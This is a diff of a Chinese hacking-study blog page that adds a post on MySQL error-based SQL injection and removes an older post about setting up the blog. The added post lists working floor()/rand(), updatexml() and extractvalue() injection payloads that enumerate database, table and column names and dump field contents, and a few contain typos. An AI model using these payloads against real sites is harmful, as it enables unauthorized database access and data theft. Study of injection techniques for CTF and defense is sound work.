@@ -41,9 +41,9 @@
     <h2 class="author">Iuhrey</h2>
     <h3 class="description">一个常年被吊打的Web手    一个唱歌不好指弹垃圾的吉他手</h3>
     <div class="count-box">
-      <a href="/archives"><div><strong>20</strong><br>文章</div></a>
+      <a href="/archives"><div><strong>21</strong><br>文章</div></a>
       <a href="/categories"><div><strong>2</strong><br>分类</div></a>
-      <a href="/tags"><div><strong>9</strong><br>标签</div></a>
+      <a href="/tags"><div><strong>10</strong><br>标签</div></a>
     </div>
     <ul class="blog-link">
      
@@ -68,6 +68,71 @@
 </div>
 
         <section id="main">
+  
+    <article id="post-sql注入之报错注入" class="wow slideInRight article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2018/05/01/sql注入之报错注入/" class="article-date">
+  <time class="post-time" datetime="2018-05-01T14:50:37.000Z" itemprop="datePublished">
+    <span class="post-month">5月</span><br/>
+    <span class="post-day">01</span>
+  </time>
+</a>
+   
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2018/05/01/sql注入之报错注入/">sql注入之报错注入</a>
+    </h1>
+  
+
+        <div>
+          
+          
+              
+
+          
+        </div>
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h2 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h2><p>报错注入是在有返回错误信息的情况下尝试使用的一种注入方式，一般是在使用延时注入之前考虑的，之所以最后归纳是因为它的注入语句实在是太过冗长，而且并没有什么逻辑规律可言，理解起来十分困难。<br>报错注入可以主要可以分为以下几种方式:<br>floor函数报错<br>UpdateXml函数报错<br>extractvalue函数报错<br>后两种方式具有一定的局限性，报错查询的内容长度最长为32位。  </p>
+<h3 id="floor-报错"><a href="#floor-报错" class="headerlink" title="floor()报错"></a>floor()报错</h3><p>在如何使用floor()报错注入的时候，应该先理解报错注入语句的意义。主要用到以下几个函数：<br>floor():向下取整<br>rand():生成随机数<br>count():统计结果<br>简单来说就是在查询的时候让其rand()产生不确定的数在使用order by排序时产生报错来返回信息。<br><strong><a href="https://mp.weixin.qq.com/s?__biz=MzA5NDY0OTQ0Mw==&amp;mid=403404979&amp;idx=1&amp;sn=27d10b6da357d72304086311cefd573e&amp;scene=1&amp;srcid=04131X3lQlrDMYOCntCqWf6n#wechat_redirect" target="_blank" rel="noopener">具体参考这篇文章</a></strong><br>我就直接给出语句：  </p>
+<blockquote>
+<p><strong>1 数据库</strong> and (select 1 from(select count(<em>),concat((select (select (select concat(0x7e,database(),0x7e))) from information_schema.tables limit 0,1),floor(rand(0)</em>2))x from information_schema.tables group by x)a) –+<br><strong>2 库名</strong> and (select 1 from(select count(<em>),concat((select (select (SELECT distinct concat(0x7e,schema_name,0x7e) FROM information_schema.schemata LIMIT 0,1)) from information_schema.tables limit 0,1),floor(rand(0)</em>2))x from information_schema.tables group by x)a) –+<br><strong>3 表名</strong> and (select 1 from(select count(<em>),concat((select (select (SELECT distinct concat(0x7e,table_name,0x7e) FROM information_schema.tables where table_schema=数据库名 LIMIT 0,1)) from information_schema.tables limit 0,1),floor(rand(0)</em>2))x from information_schema.tables group by x)a)  –+<br><strong>4 列名</strong> and (select 1 from(select count(<em>),concat((select (select (SELECT distinct concat(0x7e,column_name,0x7e) FROM information_schema.columns where table_name=表名 LIMIT 0,1)) from information_schema.tables limit 0,1),floor(rand(0)</em>2))x from information_schema.tables group by x)a) –+<br><strong>5 字段</strong> and (select 1 from(select count(<em>),concat((select (select (SELECT distinct concat(0x23,列名,0x3a,列名,0x23) FROM 表名 limit 0,1)) from information_schema.tables limit 0,1),floor(rand(0)</em>2))x from information_schema.tables group by x)a) –+  </p>
+</blockquote>
+<p>至于其他的语句自己慢慢测试，语句不限这一种，报错注入的成因并不是语句顺序的问题而是在于其逻辑。  </p>
+<h3 id="Updataxml报错"><a href="#Updataxml报错" class="headerlink" title="Updataxml报错"></a>Updataxml报错</h3><p>并没有深入学习Mysql语句，所以对Updataxml()这个函数也是不太了解的，直接贴出具体的报错注入语句吧。。。  </p>
+<blockquote>
+<p><strong>1 数据库</strong> and updatexml(1,concat(0x7e,(SELECT database()),0x7e),1) –+<br><strong>2 库名</strong> and updatexml(1,concat(0x7e,(SELECT distinct concat(0x7e, (select schema_name),0x7e) FROM information_schema.schemata limit 0,1),0x7e),1) –+<br><strong>3 表名</strong> and updatexml(1,concat(0x7e,(SELECT distinct concat(0x7e, (select table_name),0x7e) FROM information_schema.tables where table_schema=库名 limit 0,1),0x7e),1) –+<br><strong>4 列名</strong> and updatexml(1,concat(0x7e,(SELECT distinct concat(0x7e, (select column_name),0x7e) FROM information_schema.columns where table_name=表名 limit 0,1),0x7e),1) –+<br><strong>5 字段</strong> and updataxml(1,concat(0x7e,(select group_concat(列名) from 表名),0x7e),1) –+  </p>
+</blockquote>
+<h3 id="Extractvalue报错"><a href="#Extractvalue报错" class="headerlink" title="Extractvalue报错"></a>Extractvalue报错</h3><p>这个函数的原理和上个函数差不多，具体格式如下  </p>
+<blockquote>
+<p>and extractvalue(1, concat(0x7e, (select database()),0x7e))  –+  </p>
+</blockquote>
+<p>其他的和上面类似，一一对照就行了  </p>
+<h2 id="sql注入的内容还远远没有完结，之后会在题目中给出一些其他的注入方式，以及知识。"><a href="#sql注入的内容还远远没有完结，之后会在题目中给出一些其他的注入方式，以及知识。" class="headerlink" title="sql注入的内容还远远没有完结，之后会在题目中给出一些其他的注入方式，以及知识。"></a>sql注入的内容还远远没有完结，之后会在题目中给出一些其他的注入方式，以及知识。</h2>
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://yoursite.com/2018/05/01/sql注入之报错注入/" data-id="cjkjr66li000ka8vebprcll0k" class="article-share-link">分享</a>
+      
+      
+  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Web-sql注入/">Web sql注入</a></li></ul>
+
+    </footer>
+  </div>
+  
+</article>
+
+
+
+
   
     <article id="post-sql注入之时间盲注" class="wow slideInRight article article-type-post" itemscope itemprop="blogPost">
   <div class="article-meta">
@@ -113,7 +178,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://yoursite.com/2018/04/30/sql注入之时间盲注/" data-id="cjjz9twp4000vckveakcqv1ov" class="article-share-link">分享</a>
+      <a data-url="http://yoursite.com/2018/04/30/sql注入之时间盲注/" data-id="cjkjr66lc000ha8vexl4oi6pg" class="article-share-link">分享</a>
       
       
   <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Web-sql注入/">Web sql注入</a></li></ul>
@@ -184,7 +249,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://yoursite.com/2018/04/29/sql注入之布尔型注入/" data-id="cjjz9twp9000xckveo0bvlc0x" class="article-share-link">分享</a>
+      <a data-url="http://yoursite.com/2018/04/29/sql注入之布尔型注入/" data-id="cjkjr66ma000za8ve1wmrbqop" class="article-share-link">分享</a>
       
       
   <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Web-sql注入/">Web sql注入</a></li></ul>
@@ -281,7 +346,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://yoursite.com/2018/04/21/关于sql注入的一些学习心得/" data-id="cjjz9twq2001ackve205w1tvf" class="article-share-link">分享</a>
+      <a data-url="http://yoursite.com/2018/04/21/关于sql注入的一些学习心得/" data-id="cjkjr66n4001ea8vez82n0tzk" class="article-share-link">分享</a>
       
       
   <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Web-sql注入/">Web sql注入</a></li></ul>
@@ -340,7 +405,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://yoursite.com/2018/04/11/初试Getshell/" data-id="cjjz9twq9001eckveyvs59hn7" class="article-share-link">分享</a>
+      <a data-url="http://yoursite.com/2018/04/11/初试Getshell/" data-id="cjkjr66mn0014a8ves2en5lvg" class="article-share-link">分享</a>
       
       
   <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/web-shell/">web shell</a></li></ul>
@@ -401,7 +466,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://yoursite.com/2018/03/22/0x05-在蓝鲸打卡所学到的基本操作（Web篇）/" data-id="cjjz9twme0007ckveakmpyjee" class="article-share-link">分享</a>
+      <a data-url="http://yoursite.com/2018/03/22/0x05-在蓝鲸打卡所学到的基本操作（Web篇）/" data-id="cjkjr66jv0007a8vet2wln3zi" class="article-share-link">分享</a>
       
       
   <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Web-PHP/">Web PHP</a></li></ul>
@@ -452,7 +517,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://yoursite.com/2018/03/14/0x04-在蓝鲸打卡所学到的基本操作（Web篇）/" data-id="cjjz9twma0006ckvetv3fr4p1" class="article-share-link">分享</a>
+      <a data-url="http://yoursite.com/2018/03/14/0x04-在蓝鲸打卡所学到的基本操作（Web篇）/" data-id="cjkjr66lu000ra8vetjvc4dtz" class="article-share-link">分享</a>
       
       
   <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Web/">Web</a></li></ul>
@@ -508,7 +573,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://yoursite.com/2018/03/11/0x03-在蓝鲸打卡学到的基本操作（Web篇）/" data-id="cjjz9twm30005ckved006p2a9" class="article-share-link">分享</a>
+      <a data-url="http://yoursite.com/2018/03/11/0x03-在蓝鲸打卡学到的基本操作（Web篇）/" data-id="cjkjr66iy0002a8veka0fqjnm" class="article-share-link">分享</a>
       
       
   <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Web/">Web</a></li></ul>
@@ -563,7 +628,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://yoursite.com/2018/03/08/0x02-在蓝鲸打卡所学到的基本操作（Crypto篇）/" data-id="cjjz9twjr0001ckve5xdvortj" class="article-share-link">分享</a>
+      <a data-url="http://yoursite.com/2018/03/08/0x02-在蓝鲸打卡所学到的基本操作（Crypto篇）/" data-id="cjkjr66h80000a8veqq95y0vm" class="article-share-link">分享</a>
       
       
   <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Crypto/">Crypto</a></li></ul>
@@ -621,7 +686,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://yoursite.com/2018/03/07/0x01-在蓝鲸打卡所学到的基本操作（Crypto篇）/" data-id="cjjz9twlm0002ckveif9demgb" class="article-share-link">分享</a>
+      <a data-url="http://yoursite.com/2018/03/07/0x01-在蓝鲸打卡所学到的基本操作（Crypto篇）/" data-id="cjkjr66kn000ca8vezl896ict" class="article-share-link">分享</a>
       
       
   <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Crypto/">Crypto</a></li></ul>
@@ -635,60 +700,10 @@
 
 
   
-    <article id="post-0x00 关于搭建博客的一些心得" class="wow slideInRight article article-type-post" itemscope itemprop="blogPost">
-  <div class="article-meta">
-    <a href="/2018/02/28/0x00 关于搭建博客的一些心得/" class="article-date">
-  <time class="post-time" datetime="2018-02-28T10:48:26.000Z" itemprop="datePublished">
-    <span class="post-month">2月</span><br/>
-    <span class="post-day">28</span>
-  </time>
-</a>
-   
-  </div>
-  <div class="article-inner">
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2018/02/28/0x00 关于搭建博客的一些心得/">0x00  关于搭建博客的一些心得</a>
-    </h1>
-  
-
-        <div>
-          
-          
-              
-
-          
-        </div>
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <p>第一篇文章自然是讲讲我在搭博客所获得的收获了（其实是遇到各种各样的BUG）。<br>第一，hexo，node.js是不要求与教程相同的版本的，虽然有些功能不同但是大体上不会影响你博客的搭建的。<br>第二，千万别把你的Blog文件夹建立在需要管理员权限的地方，如果这样做了，在hexo deploy时会什么信息都不会返回的。<br>第三，在搭建博客时，别想着急于求成，毕竟一个好看的博客是人家花了很久才搭出来的，先把基础框架搭好，在想着逐步去完善自己的博客。<br>第四，遇到问题先百度，别去问你的室友（除非他非常好心），要不然你收到的回答是：“百度啊” “CNM百度啊”<br>“滚去百度啊”。  </p>
-<p>#最后附上我参考的链接<br>[基础教程][<a href="http://www.cnblogs.com/fengxiongZz/p/7707219.html]" target="_blank" rel="noopener">http://www.cnblogs.com/fengxiongZz/p/7707219.html]</a><br>[主题更换][<a href="https://www.jianshu.com/p/469e985288b3?from=jiantop.com]" target="_blank" rel="noopener">https://www.jianshu.com/p/469e985288b3?from=jiantop.com]</a>  </p>
-
-      
-    </div>
-    <footer class="article-footer">
-      <a data-url="http://yoursite.com/2018/02/28/0x00 关于搭建博客的一些心得/" data-id="cjjz9twhp0000ckveio0fnvdo" class="article-share-link">分享</a>
-      
-      
-    </footer>
-  </div>
-  
-</article>
-
-
-
-
-  
 
 
   <nav id="page-nav">
-    <a class="extend prev" rel="prev" href="/">&laquo; pre</a><a class="page-number" href="/">1</a><span class="page-number current">2</span>
+    <a class="extend prev" rel="prev" href="/">&laquo; pre</a><a class="page-number" href="/">1</a><span class="page-number current">2</span><a class="page-number" href="/page/3/">3</a><a class="extend next" rel="next" href="/page/3/">next &raquo;</a>
   </nav>
 </section>
         
@@ -698,7 +713,7 @@
   <h3 class="widget-title"></h3>
   <div class="widget">
     <h1 class="blog-title">Iuhrey的幻想乡</h1>
-    <h2 class="blog-subtitle"></h2>
+    <h2 class="blog-subtitle">记录日常所学</h2>
     <ul class="blog-link">
      
           <a href="/" title="Home">
@@ -729,9 +744,9 @@
     <h2 class="author">Iuhrey</h2>
     <h3 class="description">一个常年被吊打的Web手    一个唱歌不好指弹垃圾的吉他手</h3>
     <div class="count-box">
-      <a href="/archives"><div><strong>20</strong><br>文章</div></a>
+      <a href="/archives"><div><strong>21</strong><br>文章</div></a>
       <a href="/categories"><div><strong>2</strong><br>分类</div></a>
-      <a href="/tags"><div><strong>9</strong><br>标签</div></a>
+      <a href="/tags"><div><strong>10</strong><br>标签</div></a>
     </div>
 
 
